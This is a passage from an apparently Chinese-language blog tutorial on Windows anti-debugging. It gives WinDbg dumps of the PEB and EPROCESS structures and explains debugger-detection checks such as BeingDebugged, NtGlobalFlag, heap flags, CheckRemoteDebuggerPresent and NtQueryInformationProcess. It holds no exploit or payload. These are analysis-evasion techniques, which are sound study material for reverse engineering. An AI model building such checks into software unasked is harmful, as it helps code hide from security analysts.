[2] Uint4B</span><br><span class="line">   +0x04c ReadOnlySharedMemoryBase : Ptr32 Void</span><br><span class="line">   +0x050 HotpatchInformation : Ptr32 Void</span><br><span class="line">   +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void</span><br><span class="line">   +0x058 AnsiCodePageData : Ptr32 Void</span><br><span class="line">   +0x05c OemCodePageData  : Ptr32 Void</span><br><span class="line">   +0x060 UnicodeCaseTableData : Ptr32 Void</span><br><span class="line">   +0x064 NumberOfProcessors : Uint4B</span><br><span class="line">   +0x068 NtGlobalFlag     : Uint4B</span><br><span class="line">   +0x070 CriticalSectionTimeout : _LARGE_INTEGER</span><br><span class="line">   +0x078 HeapSegmentReserve : Uint4B</span><br><span class="line">   +0x07c HeapSegmentCommit : Uint4B</span><br><span class="line">   +0x080 HeapDeCommitTotalFreeThreshold : Uint4B</span><br><span class="line">   +0x084 HeapDeCommitFreeBlockThreshold : Uint4B</span><br><span class="line">   +0x088 NumberOfHeaps    : Uint4B</span><br><span class="line">   +0x08c MaximumNumberOfHeaps : Uint4B</span><br><span class="line">   +0x090 ProcessHeaps     : Ptr32 Ptr32 Void</span><br><span class="line">   +0x094 GdiSharedHandleTable : Ptr32 Void</span><br><span class="line">   +0x098 ProcessStarterHelper : Ptr32 Void</span><br><span class="line">   +0x09c GdiDCAttributeList : Uint4B</span><br><span class="line">   +0x0a0 LoaderLock       : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">   +0x0a4 OSMajorVersion   : Uint4B</span><br><span class="line">   +0x0a8 OSMinorVersion   : Uint4B</span><br><span class="line">   +0x0ac OSBuildNumber    : Uint2B</span><br><span class="line">   +0x0ae OSCSDVersion     : Uint2B</span><br><span class="line">   +0x0b0 OSPlatformId     : Uint4B</span><br><span class="line">   +0x0b4 ImageSubsystem   : Uint4B</span><br><span class="line">   +0x0b8 ImageSubsystemMajorVersion : Uint4B</span><br><span class="line">   +0x0bc ImageSubsystemMinorVersion : Uint4B</span><br><span class="line">   +0x0c0 ActiveProcessAffinityMask : Uint4B</span><br><span class="line">   +0x0c4 GdiHandleBuffer  : [34] Uint4B</span><br><span class="line">   +0x14c PostProcessInitRoutine : Ptr32     void </span><br><span class="line">   +0x150 TlsExpansionBitmap : Ptr32 Void</span><br><span class="line">   +0x154 TlsExpansionBitmapBits : [32] Uint4B</span><br><span class="line">   +0x1d4 SessionId        : Uint4B</span><br><span class="line">   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER</span><br><span class="line">   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER</span><br><span class="line">   +0x1e8 pShimData        : Ptr32 Void</span><br><span class="line">   +0x1ec AppCompatInfo    : Ptr32 Void</span><br><span class="line">   +0x1f0 CSDVersion       : _UNICODE_STRING</span><br><span class="line">   +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA</span><br><span class="line">   +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP</span><br><span class="line">   +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA</span><br><span class="line">   +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP</span><br><span class="line">   +0x208 MinimumStackCommit : Uint4B</span><br><span class="line">   +0x20c FlsCallback      : Ptr32 _FLS_CALLBACK_INFO</span><br><span class="line">   +0x210 FlsListHead      : _LIST_ENTRY</span><br><span class="line">   +0x218 FlsBitmap        : Ptr32 Void</span><br><span class="line">   +0x21c FlsBitmapBits    : [4] Uint4B</span><br><span class="line">   +0x22c FlsHighIndex     : Uint4B</span><br><span class="line">   +0x230 WerRegistrationData : Ptr32 Void</span><br><span class="line">   +0x234 WerShipAssertPtr : Ptr32 Void</span><br><span class="line">   +0x238 pContextData     : Ptr32 Void</span><br><span class="line">   +0x23c pImageHeaderHash : Ptr32 Void</span><br><span class="line">   +0x240 TracingFlags     : Uint4B</span><br><span class="line">   +0x240 HeapTracingEnabled : Pos 0, 1 Bit</span><br><span class="line">   +0x240 CritSecTracingEnabled : Pos 1, 1 Bit</span><br><span class="line">   +0x240 SpareTracingBits : Pos 2, 30 Bits</span><br></pre></td></tr></table></figure><h4 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a>BeingDebugged</h4><p>可以使用IsDebuggerPresent()也可以直接检查peb-&gt;BeingDebugged</p><h4 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h4><p>peb-&gt;NtGlobalFlag（x86为 <code>+0x068</code>, x64为 <code>+0x0BC</code>）</p><p>在启动时，NtGlobalFlag全局系统变量将使用系统注册表项中的值进行初始化：<code>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\GlobalFlag]</code></p><p>FLG_HEAP_ENABLE_TAIL_CHECK(0x10)<br>FLG_HEAP_ENABLE_FREE_CHECK(0x20)<br>FLG_HEAP_VALIDATE_PARAMETERS(0x40)</p><p>当进程由调试器启动时，Windows 内存管理器会默认启用一些特殊的堆（Heap）调试选项，以便帮助开发者发现内存泄漏或越界。这些选项包括“堆尾检查”、“堆释放检查”等，通常被调试时，该值为 0x70，即 <code>FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS</code>。</p><h4 id="Heap-Flags-ForceFlags"><a href="#Heap-Flags-ForceFlags" class="headerlink" title="Heap Flags &amp; ForceFlags"></a>Heap Flags &amp; ForceFlags</h4><p>通过 PEB 找到 <code>ProcessHeap</code> 指针，进而访问堆结构 。</p><ul><li>ProcessHeap-&gt;Flags：在正常进程中，堆应该包含 <code>HEAP_GROWABLE</code> (0x00000002) 标志。如果被调试，这个标志可能会丢失或被修改 。</li><li>ProcessHeap-&gt;ForceFlags：用于强制某些堆行为。正常情况下通常为 0，但如果被调试，它会包含非零值（依赖于操作系统版本，如 XP 下是特定值）。</li></ul><p>堆尾部填充 (Heap Tail)检查</p><ul><li>字段&#x2F;特征: 检查堆块分配后的尾部填充字节。</li><li>检测逻辑 : 调试堆通常会使用特定的填充模式：</li><li><code>0xABABABAB</code>: 表示启用了 <code>HEAP_TAIL_CHECKING_ENABLED</code>。</li><li><code>0xFEEEFEEE</code>: 表示启用了 <code>HEAP_FREE_CHECKING_ENABLED</code>（释放后填充）</li></ul><h4 id="CrossProcessFlags"><a href="#CrossProcessFlags" class="headerlink" title="CrossProcessFlags"></a>CrossProcessFlags</h4><p>第四位为ProcessUsingVEH，可用来检测是否使用了VEH</p><p><img src="/image/2025-12-31-leaning_windows_5/1767261238093.png" alt="1767261238093"></p><h3 id="内核中的进程信息检测"><a href="#内核中的进程信息检测" class="headerlink" title="内核中的进程信息检测"></a>内核中的进程信息检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">  +0x000 Pcb              : _KPROCESS// 子结构体</span><br><span class="line">  +0x0b0 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">  +0x0b4 UniqueProcessId  : Ptr32 Void// 进程的编号（任务管理器中的PID）</span><br><span class="line">  +0x0b8 ActiveProcessLinks : _LIST_ENTRY// 双向链表，所有的活动进程都链接在一起，构成了一个链表</span><br><span class="line">  +0x0c0 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">  +0x0c4 VdmObjects       : Ptr32 Void</span><br><span class="line">  +0x0c8 Flags2           : Uint4B</span><br><span class="line">  +0x0c8 JobNotReallyActive : Pos 0, 1 Bit</span><br><span class="line">  +0x0c8 AccountingFolded : Pos 1, 1 Bit</span><br><span class="line">  +0x0c8 NewProcessReported : Pos 2, 1 Bit</span><br><span class="line">  +0x0c8 ExitProcessReported : Pos 3, 1 Bit</span><br><span class="line">  +0x0c8 ReportCommitChanges : Pos 4, 1 Bit</span><br><span class="line">  +0x0c8 LastReportMemory : Pos 5, 1 Bit</span><br><span class="line">  +0x0c8 ForceWakeCharge  : Pos 6, 1 Bit</span><br><span class="line">  +0x0c8 CrossSessionCreate : Pos 7, 1 Bit</span><br><span class="line">  +0x0c8 NeedsHandleRundown : Pos 8, 1 Bit</span><br><span class="line">  +0x0c8 RefTraceEnabled  : Pos 9, 1 Bit</span><br><span class="line">  +0x0c8 PicoCreated      : Pos 10, 1 Bit</span><br><span class="line">  +0x0c8 EmptyJobEvaluated : Pos 11, 1 Bit</span><br><span class="line">  +0x0c8 DefaultPagePriority : Pos 12, 3 Bits</span><br><span class="line">  +0x0c8 PrimaryTokenFrozen : Pos 15, 1 Bit</span><br><span class="line">  +0x0c8 ProcessVerifierTarget : Pos 16, 1 Bit</span><br><span class="line">  +0x0c8 RestrictSetThreadContext : Pos 17, 1 Bit</span><br><span class="line">  +0x0c8 AffinityPermanent : Pos 18, 1 Bit</span><br><span class="line">  +0x0c8 AffinityUpdateEnable : Pos 19, 1 Bit</span><br><span class="line">  +0x0c8 PropagateNode    : Pos 20, 1 Bit</span><br><span class="line">  +0x0c8 ExplicitAffinity : Pos 21, 1 Bit</span><br><span class="line">  +0x0c8 ProcessExecutionState : Pos 22, 2 Bits</span><br><span class="line">  +0x0c8 EnableReadVmLogging : Pos 24, 1 Bit</span><br><span class="line">  +0x0c8 EnableWriteVmLogging : Pos 25, 1 Bit</span><br><span class="line">  +0x0c8 FatalAccessTerminationRequested : Pos 26, 1 Bit</span><br><span class="line">  +0x0c8 DisableSystemAllowedCpuSet : Pos 27, 1 Bit</span><br><span class="line">  +0x0c8 ProcessStateChangeRequest : Pos 28, 2 Bits</span><br><span class="line">  +0x0c8 ProcessStateChangeInProgress : Pos 30, 1 Bit</span><br><span class="line">  +0x0c8 InPrivate        : Pos 31, 1 Bit</span><br><span class="line">  +0x0cc Flags            : Uint4B</span><br><span class="line">  +0x0cc CreateReported   : Pos 0, 1 Bit</span><br><span class="line">  +0x0cc NoDebugInherit   : Pos 1, 1 Bit</span><br><span class="line">  +0x0cc ProcessExiting   : Pos 2, 1 Bit</span><br><span class="line">  +0x0cc ProcessDelete    : Pos 3, 1 Bit</span><br><span class="line">  +0x0cc ManageExecutableMemoryWrites : Pos 4, 1 Bit</span><br><span class="line">  +0x0cc VmDeleted        : Pos 5, 1 Bit</span><br><span class="line">  +0x0cc OutswapEnabled   : Pos 6, 1 Bit</span><br><span class="line">  +0x0cc Outswapped       : Pos 7, 1 Bit</span><br><span class="line">  +0x0cc FailFastOnCommitFail : Pos 8, 1 Bit</span><br><span class="line">  +0x0cc Wow64VaSpace4Gb  : Pos 9, 1 Bit</span><br><span class="line">  +0x0cc AddressSpaceInitialized : Pos 10, 2 Bits</span><br><span class="line">  +0x0cc SetTimerResolution : Pos 12, 1 Bit</span><br><span class="line">  +0x0cc BreakOnTermination : Pos 13, 1 Bit</span><br><span class="line">  +0x0cc DeprioritizeViews : Pos 14, 1 Bit</span><br><span class="line">  +0x0cc WriteWatch       : Pos 15, 1 Bit</span><br><span class="line">  +0x0cc ProcessInSession : Pos 16, 1 Bit</span><br><span class="line">  +0x0cc OverrideAddressSpace : Pos 17, 1 Bit</span><br><span class="line">  +0x0cc HasAddressSpace  : Pos 18, 1 Bit</span><br><span class="line">  +0x0cc LaunchPrefetched : Pos 19, 1 Bit</span><br><span class="line">  +0x0cc Background       : Pos 20, 1 Bit</span><br><span class="line">  +0x0cc VmTopDown        : Pos 21, 1 Bit</span><br><span class="line">  +0x0cc ImageNotifyDone  : Pos 22, 1 Bit</span><br><span class="line">  +0x0cc PdeUpdateNeeded  : Pos 23, 1 Bit</span><br><span class="line">  +0x0cc VdmAllowed       : Pos 24, 1 Bit</span><br><span class="line">  +0x0cc ProcessRundown   : Pos 25, 1 Bit</span><br><span class="line">  +0x0cc ProcessInserted  : Pos 26, 1 Bit</span><br><span class="line">  +0x0cc DefaultIoPriority : Pos 27, 3 Bits</span><br><span class="line">  +0x0cc ProcessSelfDelete : Pos 30, 1 Bit</span><br><span class="line">  +0x0cc SetTimerResolutionLink : Pos 31, 1 Bit</span><br><span class="line">  +0x0d0 CreateTime       : _LARGE_INTEGER// 进程的创建时间</span><br><span class="line">  +0x0d8 ProcessQuotaUsage : [2] Uint4B// 物理页相关的统计信息</span><br><span class="line">  +0x0e0 ProcessQuotaPeak : [2] Uint4B// 物理页相关的统计信息</span><br><span class="line">  +0x0e8 PeakVirtualSize  : Uint4B// 虚拟内存的相关统计信息</span><br><span class="line">  +0x0ec VirtualSize      : Uint4B// 虚拟内存的相关统计信息</span><br><span class="line">  +0x0f0 SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">  +0x0f8 ExceptionPortData : Ptr32 Void// 调试相关</span><br><span class="line">  +0x0f8 ExceptionPortValue : Uint4B</span><br><span class="line">  +0x0f8 ExceptionPortState : Pos 0, 3 Bits</span><br><span class="line">  +0x0fc Token            : _EX_FAST_REF</span><br><span class="line">  +0x100 MmReserved       : Uint4B</span><br><span class="line">  +0x104 AddressCreationLock : _EX_PUSH_LOCK</span><br><span class="line">  +0x108 PageTableCommitmentLock : _EX_PUSH_LOCK</span><br><span class="line">  +0x10c RotateInProgress : Ptr32 _ETHREAD</span><br><span class="line">  +0x110 ForkInProgress   : Ptr32 _ETHREAD</span><br><span class="line">  +0x114 CommitChargeJob  : Ptr32 _EJOB</span><br><span class="line">  +0x118 CloneRoot        : _RTL_AVL_TREE</span><br><span class="line">  +0x11c NumberOfPrivatePages : Uint4B</span><br><span class="line">  +0x120 NumberOfLockedPages : Uint4B</span><br><span class="line">  +0x124 Win32Process     : Ptr32 Void</span><br><span class="line">  +0x128 Job              : Ptr32 _EJOB</span><br><span class="line">  +0x12c SectionObject    : Ptr32 Void</span><br><span class="line">  +0x130 SectionBaseAddress : Ptr32 Void</span><br><span class="line">  +0x134 Cookie           : Uint4B</span><br><span class="line">  +0x138 WorkingSetWatch  : Ptr32 _PAGEFAULT_HISTORY</span><br><span class="line">  +0x13c Win32WindowStation : Ptr32 Void</span><br><span class="line">  +0x140 InheritedFromUniqueProcessId : Ptr32 Void</span><br><span class="line">  +0x144 LdtInformation   : Ptr32 Void</span><br><span class="line">  +0x148 OwnerProcessId   : Uint4B</span><br><span class="line">  +0x14c Peb              : Ptr32 _PEB// 进程环境块（进程在3环的一个结构体，里面包含了一些进程的相关信息）</span><br><span class="line">  +0x150 Session          : Ptr32 _MM_SESSION_SPACE</span><br><span class="line">  +0x154 Spare1           : Ptr32 Void</span><br><span class="line">  +0x158 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">  +0x15c ObjectTable      : Ptr32 _HANDLE_TABLE// 句柄表</span><br><span class="line">  +0x160 DebugPort        : Ptr32 Void// 调试相关</span><br><span class="line">  +0x164 PaeTop           : Ptr32 Void</span><br><span class="line">  +0x168 DeviceMap        : Ptr32 Void</span><br><span class="line">  +0x16c EtwDataSource    : Ptr32 Void</span><br><span class="line">  +0x170 PageDirectoryPte : Uint8B</span><br><span class="line">  +0x178 ImageFilePointer : Ptr32 _FILE_OBJECT</span><br><span class="line">  +0x17c ImageFileName    : [15] UChar// 进程镜像文件名</span><br><span class="line">  +0x18b PriorityClass    : UChar</span><br><span class="line">  +0x18c SecurityPort     : Ptr32 Void</span><br><span class="line">  +0x190 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line">  +0x194 JobLinks         : _LIST_ENTRY</span><br><span class="line">  +0x19c HighestUserAddress : Ptr32 Void</span><br><span class="line">  +0x1a0 ThreadListHead   : _LIST_ENTRY</span><br><span class="line">  +0x1a8 ActiveThreads    : Uint4B// 活动线程的数量</span><br><span class="line">  +0x1ac ImagePathHash    : Uint4B</span><br><span class="line">  +0x1b0 DefaultHardErrorProcessing : Uint4B</span><br><span class="line">  +0x1b4 LastThreadExitStatus : Int4B</span><br><span class="line">  +0x1b8 PrefetchTrace    : _EX_FAST_REF</span><br><span class="line">  +0x1bc LockedPagesList  : Ptr32 Void</span><br><span class="line">  +0x1c0 ReadOperationCount : _LARGE_INTEGER</span><br><span class="line">  +0x1c8 WriteOperationCount : _LARGE_INTEGER</span><br><span class="line">  +0x1d0 OtherOperationCount : _LARGE_INTEGER</span><br><span class="line">  +0x1d8 ReadTransferCount : _LARGE_INTEGER</span><br><span class="line">  +0x1e0 WriteTransferCount : _LARGE_INTEGER</span><br><span class="line">  +0x1e8 OtherTransferCount : _LARGE_INTEGER</span><br><span class="line">  +0x1f0 CommitChargeLimit : Uint4B</span><br><span class="line">  +0x1f4 CommitCharge     : Uint4B// 虚拟内存的相关统计信息</span><br><span class="line">  +0x1f8 CommitChargePeak : Uint4B</span><br><span class="line">  +0x200 Vm               : _MMSUPPORT_FULL</span><br><span class="line">  +0x300 MmProcessLinks   : _LIST_ENTRY</span><br><span class="line">  +0x308 ModifiedPageCount : Uint4B</span><br><span class="line">  +0x30c ExitStatus       : Int4B</span><br><span class="line">  +0x310 VadRoot          : _RTL_AVL_TREE// 标识哪些0-2地址没占用了</span><br><span class="line">  +0x314 VadHint          : Ptr32 Void</span><br><span class="line">  +0x318 VadCount         : Uint4B</span><br><span class="line">  +0x31c VadPhysicalPages : Uint4B</span><br><span class="line">  +0x320 VadPhysicalPagesLimit : Uint4B</span><br><span class="line">  +0x324 AlpcContext      : _ALPC_PROCESS_CONTEXT</span><br><span class="line">  +0x334 TimerResolutionLink : _LIST_ENTRY</span><br><span class="line">  +0x33c TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD</span><br><span class="line">  +0x340 RequestedTimerResolution : Uint4B</span><br><span class="line">  +0x344 SmallestTimerResolution : Uint4B</span><br><span class="line">  +0x348 ExitTime         : _LARGE_INTEGER// 进程的退出时间</span><br><span class="line">  +0x350 ActiveThreadsHighWatermark : Uint4B</span><br><span class="line">  +0x354 LargePrivateVadCount : Uint4B</span><br><span class="line">  +0x358 ThreadListLock   : _EX_PUSH_LOCK</span><br><span class="line">  +0x35c WnfContext       : Ptr32 Void</span><br><span class="line">  +0x360 ServerSilo       : Ptr32 _EJOB</span><br><span class="line">  +0x364 SignatureLevel   : UChar</span><br><span class="line">  +0x365 SectionSignatureLevel : UChar</span><br><span class="line">  +0x366 Protection       : _PS_PROTECTION</span><br><span class="line">  +0x367 HangCount        : Pos 0, 3 Bits</span><br><span class="line">  +0x367 GhostCount       : Pos 3, 3 Bits</span><br><span class="line">  +0x367 PrefilterException : Pos 6, 1 Bit</span><br><span class="line">  +0x368 Flags3           : Uint4B</span><br><span class="line">  +0x368 Minimal          : Pos 0, 1 Bit</span><br><span class="line">  +0x368 ReplacingPageRoot : Pos 1, 1 Bit</span><br><span class="line">  +0x368 Crashed          : Pos 2, 1 Bit</span><br><span class="line">  +0x368 JobVadsAreTracked : Pos 3, 1 Bit</span><br><span class="line">  +0x368 VadTrackingDisabled : Pos 4, 1 Bit</span><br><span class="line">  +0x368 AuxiliaryProcess : Pos 5, 1 Bit</span><br><span class="line">  +0x368 SubsystemProcess : Pos 6, 1 Bit</span><br><span class="line">  +0x368 IndirectCpuSets  : Pos 7, 1 Bit</span><br><span class="line">  +0x368 RelinquishedCommit : Pos 8, 1 Bit</span><br><span class="line">  +0x368 HighGraphicsPriority : Pos 9, 1 Bit</span><br><span class="line">  +0x368 CommitFailLogged : Pos 10, 1 Bit</span><br><span class="line">  +0x368 ReserveFailLogged : Pos 11, 1 Bit</span><br><span class="line">  +0x368 SystemProcess    : Pos 12, 1 Bit</span><br><span class="line">  +0x368 HideImageBaseAddresses : Pos 13, 1 Bit</span><br><span class="line">  +0x368 AddressPolicyFrozen : Pos 14, 1 Bit</span><br><span class="line">  +0x368 ProcessFirstResume : Pos 15, 1 Bit</span><br><span class="line">  +0x368 ForegroundExternal : Pos 16, 1 Bit</span><br><span class="line">  +0x368 ForegroundSystem : Pos 17, 1 Bit</span><br><span class="line">  +0x368 HighMemoryPriority : Pos 18, 1 Bit</span><br><span class="line">  +0x368 EnableProcessSuspendResumeLogging : Pos 19, 1 Bit</span><br><span class="line">  +0x368 EnableThreadSuspendResumeLogging : Pos 20, 1 Bit</span><br><span class="line">  +0x368 SecurityDomainChanged : Pos 21, 1 Bit</span><br><span class="line">  +0x368 SecurityFreezeComplete : Pos 22, 1 Bit</span><br><span class="line">  +0x368 VmProcessorHost  : Pos 23, 1 Bit</span><br><span class="line">  +0x36c DeviceAsid       : Int4B</span><br><span class="line">  +0x370 SvmData          : Ptr32 Void</span><br><span class="line">  +0x374 SvmProcessLock   : _EX_PUSH_LOCK</span><br><span class="line">  +0x378 SvmLock          : Uint4B</span><br><span class="line">  +0x37c SvmProcessDeviceListHead : _LIST_ENTRY</span><br><span class="line">  +0x388 LastFreezeInterruptTime : Uint8B</span><br><span class="line">  +0x390 DiskCounters     : Ptr32 _PROCESS_DISK_COUNTERS</span><br><span class="line">  +0x394 PicoContext      : Ptr32 Void</span><br><span class="line">  +0x398 HighPriorityFaultsAllowed : Uint4B</span><br><span class="line">  +0x39c InstrumentationCallback : Ptr32 Void</span><br><span class="line">  +0x3a0 EnergyContext    : Ptr32 _PO_PROCESS_ENERGY_CONTEXT</span><br><span class="line">  +0x3a4 VmContext        : Ptr32 Void</span><br><span class="line">  +0x3a8 SequenceNumber   : Uint8B</span><br><span class="line">  +0x3b0 CreateInterruptTime : Uint8B</span><br><span class="line">  +0x3b8 CreateUnbiasedInterruptTime : Uint8B</span><br><span class="line">  +0x3c0 TotalUnbiasedFrozenTime : Uint8B</span><br><span class="line">  +0x3c8 LastAppStateUpdateTime : Uint8B</span><br><span class="line">  +0x3d0 LastAppStateUptime : Pos 0, 61 Bits</span><br><span class="line">  +0x3d0 LastAppState     : Pos 61, 3 Bits</span><br><span class="line">  +0x3d8 SharedCommitCharge : Uint4B</span><br><span class="line">  +0x3dc SharedCommitLock : _EX_PUSH_LOCK</span><br><span class="line">  +0x3e0 SharedCommitLinks : _LIST_ENTRY</span><br><span class="line">  +0x3e8 AllowedCpuSets   : Uint4B</span><br><span class="line">  +0x3ec DefaultCpuSets   : Uint4B</span><br><span class="line">  +0x3e8 AllowedCpuSetsIndirect : Ptr32 Uint4B</span><br><span class="line">  +0x3ec DefaultCpuSetsIndirect : Ptr32 Uint4B</span><br><span class="line">  +0x3f0 DiskIoAttribution : Ptr32 Void</span><br><span class="line">  +0x3f4 DxgProcess       : Ptr32 Void</span><br><span class="line">  +0x3f8 Win32KFilterSet  : Uint4B</span><br><span class="line">  +0x400 ProcessTimerDelay : _PS_INTERLOCKED_TIMER_DELAY_VALUES</span><br><span class="line">  +0x408 KTimerSets       : Uint4B</span><br><span class="line">  +0x40c KTimer2Sets      : Uint4B</span><br><span class="line">  +0x410 ThreadTimerSets  : Uint4B</span><br><span class="line">  +0x414 VirtualTimerListLock : Uint4B</span><br><span class="line">  +0x418 VirtualTimerListHead : _LIST_ENTRY</span><br><span class="line">  +0x420 WakeChannel      : _WNF_STATE_NAME</span><br><span class="line">  +0x420 WakeInfo         : _PS_PROCESS_WAKE_INFORMATION</span><br><span class="line">  +0x450 MitigationFlags  : Uint4B</span><br><span class="line">  +0x450 MitigationFlagsValues : &lt;anonymous-tag&gt;</span><br><span class="line">  +0x454 MitigationFlags2 : Uint4B</span><br><span class="line">  +0x454 MitigationFlags2Values : &lt;anonymous-tag&gt;</span><br><span class="line">  +0x458 PartitionObject  : Ptr32 Void</span><br><span class="line">  +0x460 SecurityDomain   : Uint8B</span><br><span class="line">  +0x468 ParentSecurityDomain : Uint8B</span><br><span class="line">  +0x470 CoverageSamplerContext : Ptr32 Void</span><br><span class="line">  +0x474 MmHotPatchContext : Ptr32 Void</span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckRemoteDebuggerPresent(</span><br><span class="line">  [in]      HANDLE hProcess,</span><br><span class="line">  [in, out] PBOOL  pbDebuggerPresent</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>底层为调用NtQueryInformationProcess(ProcessDebugPort)</p><h4 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 